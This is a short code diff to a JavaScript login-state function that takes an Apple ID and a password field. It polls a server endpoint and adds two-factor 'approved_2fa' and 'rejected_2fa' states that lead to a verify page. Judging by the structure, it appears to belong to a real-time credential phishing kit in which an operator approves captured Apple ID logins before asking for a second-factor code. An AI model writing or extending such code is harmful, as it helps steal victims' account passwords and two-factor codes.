@@ -397,9 +397,9 @@ async function checkState(appleid) {
     const res = await fetch('/api/check-state');
     const state = await res.json();
     
-    if (state.status === 'approved') {
+    if (state.status === 'approved' || state.status === 'approved_2fa') {
       window.location.href = '/pages/verify.html?appleid=' + encodeURIComponent(appleid);
-    } else if (state.status === 'rejected') {
+    } else if (state.status === 'rejected' || state.status === 'rejected_2fa') {
       const passwordInput = document.getElementById('password');
       const errorDiv = document.getElementById('loginError');
       
